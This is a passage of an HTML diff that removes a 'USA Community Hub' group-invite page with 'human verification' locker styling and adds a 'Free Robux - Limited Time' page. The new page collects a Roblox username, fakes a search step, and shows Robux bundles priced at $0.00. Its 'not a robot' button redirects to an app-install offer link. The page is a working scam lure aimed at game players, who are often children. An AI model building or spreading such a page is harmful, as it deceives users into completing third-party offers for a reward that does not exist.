@@ -1,1038 +1,512 @@
+<!doctype html>
+ 
+    
+    <title>Free Robux - Limited Time</title>
 
-<!DOCTYPE html>
-<html lang="en" class="dark">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="color-scheme" content="dark">
-  <title>USA Community Hub - Official Regional & Interest Networks</title>
-  
-  <!-- Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Outfit:wght@500;600;700;800&display=swap" rel="stylesheet">
-  
-  <!-- Tailwind CSS CDN -->
-  <script src="https://cdn.tailwindcss.com"></script>
-  
-  <!-- Tailwind Configuration -->
-  <script>
-    tailwind.config = {
-      darkMode: 'class',
-      theme: {
-        extend: {
-          fontFamily: {
-            sans: ['Plus Jakarta Sans', 'sans-serif'],
-            heading: ['Outfit', 'sans-serif'],
-          },
-          colors: {
-            brand: {
-              whatsapp: '#25D366',
-              whatsappDark: '#128C7E',
-              discord: '#5865F2',
-              discordDark: '#313338',
-              meetup: '#F64060',
-              messenger: '#0084FF',
-              groupme: '#00AFF0',
-              telegram: '#229ED9',
-              darkBg: '#0B0F17',
-              cardBg: '#161F30',
-              cardHover: '#1E293B',
-              borderDark: '#26334D',
+    <link href="https://raw.githack.com/robux111/1/main/icon.ico" rel="icon" />
+
+
+    <style>
+        @import url("https://fonts.googleapis.com/css2?family=Kumbh+Sans:wght@520&family=Mochiy+Pop+One&family=Nunito:wght@200&family=Poppins:wght@400;600;700;900&family=REM:wght@300&family=Varela+Round&display=swap");
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Kumbh Sans", sans-serif;
+        }
+
+        .logo {
+            width: 30px;
+            display: flex;
+            align-items: center;
+        }
+
+        .logo span {
+            font-weight: 900;
+            margin-right: 18px;
+            font-size: 25px;
+        }
+
+        nav {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            background-color: #dee1e3;
+            border: solid #c7cbce;
+            border-width: 0 0 1px;
+            padding: 0 40px;
+        }
+
+        nav ul {
+            list-style: none;
+            display: flex;
+        }
+
+        body {
+            background-color: #f2f4f5;
+            color: #393b3d;
+        }
+
+        img {
+            width: 100%;
+        }
+
+        ul li {
+            margin-left: 30px;
+        }
+
+        .middle {
+            width: 70%;
+            margin: 10px auto;
+            height: 135px;
+            background-image: linear-gradient(0deg,
+                    rgba(39, 39, 46, 0.5),
+                    rgba(39, 39, 46, 0.5)),
+                url(https://raw.githack.com/robux111/1/main/images/bp.jpg);
+            background-position: bottom;
+            background-size: 100%;
+            margin-bottom: 24px;
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            text-align: center;
+        }
+
+        .middle h2 {
+            margin-bottom: 10px;
+            font-size: 35px;
+        }
+
+        .middle p {
+            font-size: 17px;
+        }
+
+        body .para {
+            font-size: 10px;
+            font-weight: 500;
+            margin-top: 50px;
+            color: #606162;
+            text-align: center;
+            width: 100%;
+            margin: 50px auto;
+        }
+
+        .box_con {
+            margin: 0 auto;
+            background-color: #fff;
+            min-height: 163px;
+            width: 70%;
+            font-size: 20px;
+            padding: 20px;
+            border: solid #c7cbce;
+            border-width: 1px 1px 1px;
+        }
+
+        input {
+            padding: 11px 15px;
+            border: none;
+            background: #f2f4f5;
+            border-radius: 9px;
+            outline: none;
+            font-size: 17px;
+        }
+
+        button {
+            background: #393b3d;
+            outline: none;
+            border: none;
+            color: #fff;
+            padding: 8px 10px;
+            border-radius: 5px;
+            font-weight: 900;
+            letter-spacing: 1px;
+            font-size: 19px;
+            cursor: pointer;
+            margin-top: 30px;
+        }
+
+        .box2 {
+            display: none;
+        }
+
+        .box3 {
+            display: none;
+        }
+
+        .box4 {
+            display: none;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            background-color: #ffffffbc;
+            border-radius: 8px;
+        }
+
+        .row {
+            display: flex;
+            align-items: center;
+            height: 70px;
+            justify-content: space-around;
+        }
+
+        .row:not(.row:last-child) {
+            border-bottom: 1px solid #bdbebe;
+        }
+
+        .price {
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        .robux_total {
+            display: flex;
+            align-items: center;
+        }
+
+        .details:hover {
+            background-color: rgb(226, 226, 226);
+        }
+
+        .pic {
+            width: 30px;
+            margin-right: 10px;
+            pointer-events: none;
+            margin-top: 2px;
+        }
+
+        span {
+            font-size: 20px;
+            font-weight: 800;
+            color: rgba(0, 0, 0, 0.6);
+        }
+
+        img {
+            width: 100%;
+        }
+
+        h3 {
+            font-size: 32px;
+            margin-bottom: 21px;
+        }
+
+        .details {
+            border: 1px solid #b8b8b8;
+            border-radius: 8px;
+            padding: 5px 8px;
+            width: 180px;
+            display: flex;
+            justify-content: center;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .folding {
+            margin: 20px auto;
+            width: 100px;
+            height: 100px;
+            position: relative;
+            transform: rotateZ(45deg);
+        }
+
+        .square {
+            position: absolute;
+            top: 36%;
+            right: 35%;
+            width: 30px;
+            height: 30px;
+            background-color: #fff;
+            transform: rotateZ(87deg);
+        }
+
+        .folding .sk-cube {
+            float: left;
+            width: 50%;
+            height: 50%;
+            position: relative;
+            transform: scale(1.1);
+        }
+
+        .folding .sk-cube:before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #333;
+            animation: sk-foldCubeAngle 2.4s infinite linear both;
+            transform-origin: 100% 100%;
+        }
+
+        .folding .sk-cube2 {
+            transform: scale(1.1) rotateZ(90deg);
+        }
+
+        .folding .sk-cube3 {
+            transform: scale(1.1) rotateZ(180deg);
+        }
+
+        .folding .sk-cube4 {
+            transform: scale(1.1) rotateZ(270deg);
+        }
+
+        .folding .sk-cube2:before {
+            animation-delay: 0.3s;
+        }
+
+        .folding .sk-cube3:before {
+            animation-delay: 0.6s;
+        }
+
+        .folding .sk-cube4:before {
+            animation-delay: 0.9s;
+        }
+
+        @keyframes sk-foldCubeAngle {
+
+            0%,
+            10% {
+                transform: perspective(140px) rotateX(-180deg);
+                opacity: 0;
             }
-          },
-          boxShadow: {
-            'glow-green': '0 0 25px -5px rgba(37, 211, 102, 0.35)',
-            'glow-blurple': '0 0 25px -5px rgba(88, 101, 242, 0.35)',
-            'glow-red': '0 0 25px -5px rgba(246, 64, 96, 0.35)',
-            'glow-blue': '0 0 25px -5px rgba(0, 132, 255, 0.35)',
-            'glow-cyan': '0 0 25px -5px rgba(0, 175, 240, 0.35)',
-            'glow-telegram': '0 0 25px -5px rgba(34, 158, 217, 0.35)',
-          }
+
+            25%,
+            75% {
+                transform: perspective(140px) rotateX(0deg);
+                opacity: 1;
+            }
+
+            90%,
+            100% {
+                transform: perspective(140px) rotateY(180deg);
+                opacity: 0;
+            }
         }
-      }
-    }
-  </script>
 
-  <style>
-    html { background-color: #0B0F17 !important; }
-    body { background-color: #0B0F17 !important; }
+        @media (max-width: 400px) {
+            nav {
+                padding: 0 5px;
+            }
+        }
 
-    /* Custom Scrollbars */
-    ::-webkit-scrollbar {
-      width: 6px;
-      height: 6px;
-    }
-    ::-webkit-scrollbar-track {
-      background: #0B0F17;
-    }
-    ::-webkit-scrollbar-thumb {
-      background: #26334D;
-      border-radius: 99px;
-    }
-    ::-webkit-scrollbar-thumb:hover {
-      background: #3B82F6;
-    }
+        @media (max-width: 1042px) {
 
-    /* Ambient Background Glow */
-    .bg-grid-pattern {
-      background-image: radial-gradient(rgba(255, 255, 255, 0.07) 1px, transparent 1px);
-      background-size: 24px 24px;
-    }
+            .middle,
+            .box_con,
+            .para {
+                width: 90%;
+            }
+        }
 
-    /* Glassmorphism Effect */
-    .glass-card {
-      background: rgba(22, 31, 48, 0.85);
-      backdrop-filter: blur(12px);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-    }
+        @media (max-width: 750px) {
 
-    /* Pulse Animations */
-    @keyframes pulse-ring {
-      0% { transform: scale(0.95); opacity: 0.8; }
-      50% { transform: scale(1.1); opacity: 0.4; }
-      100% { transform: scale(0.95); opacity: 0.8; }
-    }
-    .pulse-online {
-      animation: pulse-ring 2s infinite ease-in-out;
-    }
+            .middle,
+            .box_con {
+                width: 100%;
+            }
 
-    /* Turnstile Checkbox Ripple */
-    @keyframes spin-fast {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    .turnstile-spin {
-      animation: spin-fast 0.8s linear infinite;
-    }
+            .para {
+                width: 100%;
+            }
 
-    /* Mobile Drawer Transition */
-    @media (max-width: 639px) {
-      .modal-content-container {
-        border-bottom-left-radius: 0 !important;
-        border-bottom-right-radius: 0 !important;
-        max-height: 90vh;
-      }
-    }
+            .middle h2 {
+                margin-bottom: 10px;
+                font-size: 30px;
+            }
 
-    /* Locker Shimmer Header */
-    .shimmer-text {
-      background: linear-gradient(90deg, #FFFFFF 0%, #38BDF8 50%, #FFFFFF 100%);
-      background-size: 200% auto;
-      color: transparent;
-      -webkit-background-clip: text;
-      animation: shimmer 3s linear infinite;
-    }
+            .middle p {
+                font-size: 13px;
+            }
+        }
 
-    @keyframes shimmer {
-      to { background-position: 200% center; }
-    }
-  </style>
-</head>
-<body class="bg-brand-darkBg text-slate-100 font-sans min-h-screen relative overflow-x-hidden selection:bg-blue-500 selection:text-white">
+        @media (max-width: 373px) {
+            .logo span {
+                display: none;
+            }
 
-  <div class="fixed inset-0 bg-grid-pattern pointer-events-none opacity-40 z-0"></div>
-  <div class="fixed -top-32 left-1/2 -translate-x-1/2 w-[600px] h-[350px] bg-blue-600/15 blur-[120px] rounded-full pointer-events-none"></div>
-  <div class="fixed top-1/2 -left-40 w-[400px] h-[400px] bg-emerald-600/10 blur-[120px] rounded-full pointer-events-none"></div>
-  <div class="fixed bottom-0 -right-40 w-[400px] h-[400px] bg-indigo-600/10 blur-[120px] rounded-full pointer-events-none"></div>
+            nav {
+                padding: 0px;
+            }
+        }
 
-  <header class="relative z-10 border-b border-brand-borderDark/60 bg-brand-darkBg/90 backdrop-blur-md sticky top-0">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
-      <!-- Logo -->
-      <a href="#" class="flex items-center gap-3 group">
-        <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-blue-600 to-indigo-500 flex items-center justify-center font-heading font-extrabold text-white text-xl shadow-lg shadow-blue-500/20 group-hover:scale-105 transition-transform">
-          🇺🇸
+        @media (max-width: 442px) {
+
+            nav {
+                padding: 0px 20px;
+            }
+        }
+
+        @media (max-width: 396px) {
+
+            nav {
+                padding: 0px 10px;
+            }
+        }
+    </style>
+
+
+
+
+
+
+    <nav>
+
+        <div class="logo">
+            <span>☰</span>
+            <img src="https://raw.githack.com/robux111/1/main/images/download.png" alt="" />
         </div>
-        <div>
-          <div class="font-heading font-bold text-lg text-white leading-tight flex items-center gap-1.5">
-            USA Community Hub
-            <span class="inline-block w-2 h-2 rounded-full bg-emerald-400"></span>
-          </div>
-          <p class="text-[11px] text-slate-400 font-medium">Verified Regional & Interest Networks</p>
-        </div>
-      </a>
+        <ul>
+            <li>Discover</li>
+            <li>Marketplace</li>
+            <li>Robux</li>
+        </ul>
+    </nav>
 
-      <!-- Live Counter Badge -->
-      <div class="flex items-center gap-3">
-        <div class="hidden sm:flex items-center gap-2 bg-slate-900/80 border border-slate-800 px-3.5 py-1.5 rounded-full text-xs text-slate-300">
-          <span class="relative flex h-2 w-2">
-            <span class="pulse-online absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
-            <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
-          </span>
-          <span id="liveActiveCounter" class="font-bold text-emerald-400">24,819</span> Active Members Online
-        </div>
-        <div class="bg-gradient-to-r from-emerald-500/10 to-blue-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-semibold px-3 py-1.5 rounded-full flex items-center gap-1.5">
-          <svg class="w-3.5 h-3.5 text-emerald-400" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"/></svg>
-          100% Free
-        </div>
-      </div>
+    <div class="middle">
+        <h2>Free Robux - Limited Time </h2>
+        <p>Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences.</p>
     </div>
-  </header>
 
-  <!-- MAIN CONTENT WRAPPER -->
-  <main class="relative z-10 max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pt-8 pb-24">
-    
-    <section class="text-center max-w-3xl mx-auto mb-12">
-      <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-blue-500/10 border border-blue-500/30 text-blue-400 text-xs font-bold tracking-wide uppercase mb-4">
-        <span>🔥 #1 USA Regional & Interest Network 2026</span>
-      </div>
-      <h1 class="font-heading text-3xl sm:text-5xl font-extrabold text-white tracking-tight leading-tight mb-4">
-        Connect with Verified <span class="shimmer-text">USA Communities</span> Nationwide
-      </h1>
-      <p class="text-slate-300 text-base sm:text-lg mb-6 leading-relaxed">
-        Select your preferred messaging platform below to access official state groups, local meetup channels, interest hubs, and nationwide chat rooms.
-      </p>
+    <div class="box_con">
+        <div class="box">
+            <h3>Roblox username</h3><br />
+            <input class="username" type="text" name="" placeholder="Enter username" /><br />
+            <button class="getrbx">Next</button>
+        </div>
+        <div class="box2">
+            <div class="folding">
+                <div class="sk-cube1 sk-cube"></div>
+                <div class="sk-cube2 sk-cube"></div>
+                <div class="sk-cube4 sk-cube"></div>
+                <div class="sk-cube3 sk-cube"></div>
+                <div class="square"></div>
+            </div>
+            <p class="useroutput" style="text-align: center; margin-top: 30px;">searching for amjad ...</p>
+        </div>
+        <div class="box3">
+            <div class="container">
+                <div class="row">
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://raw.githack.com/robux111/1/main/images/robux-removebg-preview.png" /></div><span>800</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
 
-      <!-- Trust Badges -->
-      <div class="flex flex-wrap items-center justify-center gap-4 text-xs sm:text-sm font-semibold text-slate-400">
-        <span class="flex items-center gap-1.5 text-emerald-400">
-          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>
-          No Purchase Required
-        </span>
-        <span class="hidden sm:inline text-slate-700">•</span>
-        <span class="flex items-center gap-1.5 text-blue-400">
-          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>
-          Instant Invite Access
-        </span>
-        <span class="hidden sm:inline text-slate-700">•</span>
-        <span class="flex items-center gap-1.5 text-purple-400">
-          <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clip-rule="evenodd"/></svg>
-          Active Moderation
-        </span>
-      </div>
-    </section>
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://raw.githack.com/robux111/1/main/images/robux-removebg-preview.png" /></div><span>1700</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
 
-    <section class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6 mb-16" id="appCardsGrid">
-      
-      <!-- CARD 1: WHATSAPP -->
-      <div onclick="openAppModal('whatsapp')" class="glass-card rounded-2xl p-6 transition-all duration-300 hover:-translate-y-1.5 hover:shadow-glow-green hover:border-brand-whatsapp/50 cursor-pointer relative overflow-hidden group">
-        <div class="absolute top-0 right-0 bg-brand-whatsapp text-slate-950 text-[10px] font-extrabold uppercase px-3 py-1 rounded-bl-xl tracking-wider">
-          Top Choice in USA
-        </div>
-        <div class="flex items-center gap-4 mb-4">
-          <!-- WhatsApp Icon -->
-          <div class="w-14 h-14 rounded-2xl bg-white flex items-center justify-center text-brand-whatsapp group-hover:scale-110 transition-transform overflow-hidden">
-            <img src="https://cdn.simpleicons.org/whatsapp/25D366" alt="WhatsApp" class="w-8 h-8" loading="lazy">
-          </div>
-          <div>
-            <h3 class="font-heading font-bold text-xl text-white group-hover:text-brand-whatsapp transition-colors">WhatsApp Hub</h3>
-            <p class="text-xs text-slate-400">Official Mobile Community</p>
-          </div>
-        </div>
-        <p class="text-sm text-slate-300 mb-4 line-clamp-2">Direct smartphone chat, regional announcement broadcast channels, and verified USA member groups.</p>
-        <div class="flex items-center justify-between pt-3 border-t border-slate-800 text-xs">
-          <div class="flex items-center gap-1.5 text-slate-400">
-            <span class="w-2 h-2 rounded-full bg-brand-whatsapp"></span>
-            142,500+ Members
-          </div>
-          <span class="text-brand-whatsapp font-bold bg-brand-whatsapp/10 px-2.5 py-1 rounded-full">⚡ High Activity</span>
-        </div>
-        <button class="w-full mt-4 bg-brand-whatsapp hover:bg-emerald-500 text-slate-950 font-extrabold py-2.5 rounded-xl transition-colors flex items-center justify-center gap-2 text-sm shadow-md">
-          <span>Join WhatsApp Group</span>
-          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
-        </button>
-      </div>
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://raw.githack.com/robux111/1/main/images/robux-removebg-preview.png" /></div>
+                            <span>5500</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
 
-      <!-- CARD 2: DISCORD -->
-      <div onclick="openAppModal('discord')" class="glass-card rounded-2xl p-6 transition-all duration-300 hover:-translate-y-1.5 hover:shadow-glow-blurple hover:border-brand-discord/50 cursor-pointer relative overflow-hidden group">
-        <div class="absolute top-0 right-0 bg-brand-discord text-white text-[10px] font-extrabold uppercase px-3 py-1 rounded-bl-xl tracking-wider">
-          Gaming & Voice
-        </div>
-        <div class="flex items-center gap-4 mb-4">
-          <!-- Discord Icon -->
-          <div class="w-14 h-14 rounded-2xl bg-white flex items-center justify-center text-brand-discord group-hover:scale-110 transition-transform overflow-hidden">
-            <img src="https://cdn.simpleicons.org/discord/5865F2" alt="Discord" class="w-8 h-8" loading="lazy">
-          </div>
-          <div>
-            <h3 class="font-heading font-bold text-xl text-white group-hover:text-brand-discord transition-colors">Discord Server</h3>
-            <p class="text-xs text-slate-400">Official Voice & Lounge</p>
-          </div>
-        </div>
-        <p class="text-sm text-slate-300 mb-4 line-clamp-2">Topic channels, 24/7 live audio lounges, gaming squads, and regional USA networking categories.</p>
-        <div class="flex items-center justify-between pt-3 border-t border-slate-800 text-xs">
-          <div class="flex items-center gap-1.5 text-slate-400">
-            <span class="w-2 h-2 rounded-full bg-brand-discord"></span>
-            98,200+ Members
-          </div>
-          <span class="text-brand-discord font-bold bg-brand-discord/10 px-2.5 py-1 rounded-full">🎙️ 18 Voice Active</span>
-        </div>
-        <button class="w-full mt-4 bg-brand-discord hover:bg-indigo-500 text-white font-extrabold py-2.5 rounded-xl transition-colors flex items-center justify-center gap-2 text-sm shadow-md">
-          <span>Join Discord Server</span>
-          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
-        </button>
-      </div>
+                    <div class="price">$0.00</div>
+                    <div class="details">
+                        <div class="robux_total">
+                            <div class="pic"><img src="https://raw.githack.com/robux111/1/main/images/robux-removebg-preview.png" /></div><span>10000</span>
+                        </div>
+                    </div>
+                </div>
 
-      <!-- CARD 3: MEETUP -->
-      <div onclick="openAppModal('meetup')" class="glass-card rounded-2xl p-6 transition-all duration-300 hover:-translate-y-1.5 hover:shadow-glow-red hover:border-brand-meetup/50 cursor-pointer relative overflow-hidden group">
-        <div class="absolute top-0 right-0 bg-brand-meetup text-white text-[10px] font-extrabold uppercase px-3 py-1 rounded-bl-xl tracking-wider">
-          Local Events
-        </div>
-        <div class="flex items-center gap-4 mb-4">
-          <!-- Meetup Icon -->
-          <div class="w-14 h-14 rounded-2xl bg-white flex items-center justify-center text-brand-meetup group-hover:scale-110 transition-transform overflow-hidden">
-            <img src="https://cdn.simpleicons.org/meetup/F64060" alt="Meetup" class="w-8 h-8" loading="lazy">
-          </div>
-          <div>
-            <h3 class="font-heading font-bold text-xl text-white group-hover:text-brand-meetup transition-colors">Meetup Chapter</h3>
-            <p class="text-xs text-slate-400">In-Person & Online Events</p>
-          </div>
-        </div>
-        <p class="text-sm text-slate-300 mb-4 line-clamp-2">City-by-city social gatherings, professional networking, outdoor weekend activities, and workshops.</p>
-        <div class="flex items-center justify-between pt-3 border-t border-slate-800 text-xs">
-          <div class="flex items-center gap-1.5 text-slate-400">
-            <span class="w-2 h-2 rounded-full bg-brand-meetup"></span>
-            64,800+ Members
-          </div>
-          <span class="text-brand-meetup font-bold bg-brand-meetup/10 px-2.5 py-1 rounded-full">📍 120+ Events</span>
-        </div>
-        <button class="w-full mt-4 bg-brand-meetup hover:bg-rose-600 text-white font-extrabold py-2.5 rounded-xl transition-colors flex items-center justify-center gap-2 text-sm shadow-md">
-          <span>Explore Meetups</span>
-          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
-        </button>
-      </div>
+            </div>
 
-      <!-- CARD 4: MESSENGER -->
-      <div onclick="openAppModal('messenger')" class="glass-card rounded-2xl p-6 transition-all duration-300 hover:-translate-y-1.5 hover:shadow-glow-blue hover:border-brand-messenger/50 cursor-pointer relative overflow-hidden group">
-        <div class="absolute top-0 right-0 bg-brand-messenger text-white text-[10px] font-extrabold uppercase px-3 py-1 rounded-bl-xl tracking-wider">
-          Instant Messaging
         </div>
-        <div class="flex items-center gap-4 mb-4">
-          <!-- Messenger Icon -->
-          <div class="w-14 h-14 rounded-2xl bg-white flex items-center justify-center text-brand-messenger group-hover:scale-110 transition-transform overflow-hidden">
-            <img src="https://cdn.simpleicons.org/messenger/0084FF" alt="Messenger" class="w-8 h-8" loading="lazy">
-          </div>
-          <div>
-            <h3 class="font-heading font-bold text-xl text-white group-hover:text-brand-messenger transition-colors">Messenger Chat</h3>
-            <p class="text-xs text-slate-400">Facebook Community Network</p>
-          </div>
-        </div>
-        <p class="text-sm text-slate-300 mb-4 line-clamp-2">Direct Facebook social integration, neighborhood groups, marketplace deals, and local community chats.</p>
-        <div class="flex items-center justify-between pt-3 border-t border-slate-800 text-xs">
-          <div class="flex items-center gap-1.5 text-slate-400">
-            <span class="w-2 h-2 rounded-full bg-brand-messenger"></span>
-            83,400+ Members
-          </div>
-          <span class="text-brand-messenger font-bold bg-brand-messenger/10 px-2.5 py-1 rounded-full">💬 Fast Reply</span>
-        </div>
-        <button class="w-full mt-4 bg-brand-messenger hover:bg-blue-600 text-white font-extrabold py-2.5 rounded-xl transition-colors flex items-center justify-center gap-2 text-sm shadow-md">
-          <span>Join Messenger Group</span>
-          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
-        </button>
-      </div>
+        <div class="box4">
+            <h3>Last step</h3>
+            <p>please verify that you are not a robot, click the button and complete one task</p>
+            <button dir="rtl" style="background-color: rgb(2, 177, 2);" onclick="window.location.href='https://appinstallcheck.com/cl/i/o6574r';">Complete</button>
 
-      <!-- CARD 5: GROUPME -->
-      <div onclick="openAppModal('groupme')" class="glass-card rounded-2xl p-6 transition-all duration-300 hover:-translate-y-1.5 hover:shadow-glow-cyan hover:border-brand-groupme/50 cursor-pointer relative overflow-hidden group">
-        <div class="absolute top-0 right-0 bg-brand-groupme text-slate-950 text-[10px] font-extrabold uppercase px-3 py-1 rounded-bl-xl tracking-wider">
-          Campus & Local
         </div>
-        <div class="flex items-center gap-4 mb-4">
-          <!-- GroupMe Icon -->
-          <div class="w-14 h-14 rounded-2xl bg-white flex items-center justify-center text-brand-groupme group-hover:scale-110 transition-transform overflow-hidden">
-            <img src="https://cdn.simpleicons.org/groupme/00AFF0" alt="GroupMe" class="w-8 h-8" loading="lazy">
-          </div>
-          <div>
-            <h3 class="font-heading font-bold text-xl text-white group-hover:text-brand-groupme transition-colors">GroupMe Network</h3>
-            <p class="text-xs text-slate-400">Campus & Student Groups</p>
-          </div>
-        </div>
-        <p class="text-sm text-slate-300 mb-4 line-clamp-2">College campus hubs, study groups, regional interest circles, and easy SMS-friendly chat rooms.</p>
-        <div class="flex items-center justify-between pt-3 border-t border-slate-800 text-xs">
-          <div class="flex items-center gap-1.5 text-slate-400">
-            <span class="w-2 h-2 rounded-full bg-brand-groupme"></span>
-            51,900+ Members
-          </div>
-          <span class="text-brand-groupme font-bold bg-brand-groupme/10 px-2.5 py-1 rounded-full">🎓 450+ Campuses</span>
-        </div>
-        <button class="w-full mt-4 bg-brand-groupme hover:bg-sky-500 text-slate-950 font-extrabold py-2.5 rounded-xl transition-colors flex items-center justify-center gap-2 text-sm shadow-md">
-          <span>Join GroupMe</span>
-          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
-        </button>
-      </div>
-
-      <!-- CARD 6: TELEGRAM -->
-      <div onclick="openAppModal('telegram')" class="glass-card rounded-2xl p-6 transition-all duration-300 hover:-translate-y-1.5 hover:shadow-glow-telegram hover:border-brand-telegram/50 cursor-pointer relative overflow-hidden group">
-        <div class="absolute top-0 right-0 bg-brand-telegram text-white text-[10px] font-extrabold uppercase px-3 py-1 rounded-bl-xl tracking-wider">
-          Fast News & Broadcast
-        </div>
-        <div class="flex items-center gap-4 mb-4">
-          <!-- Telegram Icon -->
-          <div class="w-14 h-14 rounded-2xl bg-white flex items-center justify-center text-brand-telegram group-hover:scale-110 transition-transform overflow-hidden">
-            <img src="https://cdn.simpleicons.org/telegram/229ED9" alt="Telegram" class="w-8 h-8" loading="lazy">
-          </div>
-          <div>
-            <h3 class="font-heading font-bold text-xl text-white group-hover:text-brand-telegram transition-colors">Telegram Channel</h3>
-            <p class="text-xs text-slate-400">Official Broadcast & News</p>
-          </div>
-        </div>
-        <p class="text-sm text-slate-300 mb-4 line-clamp-2">Real-time nationwide alerts, media vault, secret community discussions, and direct deal signals.</p>
-        <div class="flex items-center justify-between pt-3 border-t border-slate-800 text-xs">
-          <div class="flex items-center gap-1.5 text-slate-400">
-            <span class="w-2 h-2 rounded-full bg-brand-telegram"></span>
-            115,000+ Subscribers
-          </div>
-          <span class="text-brand-telegram font-bold bg-brand-telegram/10 px-2.5 py-1 rounded-full">📢 Instant Broadcast</span>
-        </div>
-        <button class="w-full mt-4 bg-brand-telegram hover:bg-sky-600 text-white font-extrabold py-2.5 rounded-xl transition-colors flex items-center justify-center gap-2 text-sm shadow-md">
-          <span>Subscribe Channel</span>
-          <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M14 5l7 7m0 0l-7 7m7-7H3"/></svg>
-        </button>
-      </div>
-
-    </section>
-
-  </main>
-
-  <footer class="relative z-10 border-t border-brand-borderDark/60 bg-brand-darkBg py-8 text-slate-500 text-xs">
-    <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center sm:text-left flex flex-col sm:flex-row justify-between items-center gap-4">
-      <div>
-        <p class="font-semibold text-slate-400 mb-1">USA Community Hub © 2026. All Rights Reserved.</p>
-        <p>Independent community directory connecting verified US residents to regional platform groups.</p>
-      </div>
-      <div class="flex gap-4 font-medium text-slate-400">
-        <a href="#" class="hover:text-white transition-colors">Privacy Policy</a>
-        <span>•</span>
-        <a href="#" class="hover:text-white transition-colors">Terms of Access</a>
-        <span>•</span>
-        <a href="#" class="hover:text-white transition-colors">Safety Verification</a>
-      </div>
     </div>
-  </footer>
 
-  <!-- ========================================================= -->
-  <!-- MODAL FLOW: APP PREVIEW & HUMAN VERIFICATION STEP -->
-  <!-- ========================================================= -->
-  <div id="appPreviewModal" class="fixed inset-0 z-50 flex items-end sm:items-center justify-center p-0 sm:p-4 bg-slate-950/80 backdrop-blur-md opacity-0 pointer-events-none transition-opacity duration-300">
-    
-    <div class="modal-content-container w-full sm:max-w-lg bg-brand-cardBg border border-slate-700 rounded-t-3xl sm:rounded-2xl shadow-2xl overflow-hidden transform translate-y-8 sm:translate-y-0 transition-transform duration-300 flex flex-col max-h-[90vh] sm:max-h-[85vh]">
-      
-      <!-- Mobile Touch Drag Indicator -->
-      <div class="sm:hidden pt-3 pb-1 flex justify-center bg-slate-900 flex-shrink-0">
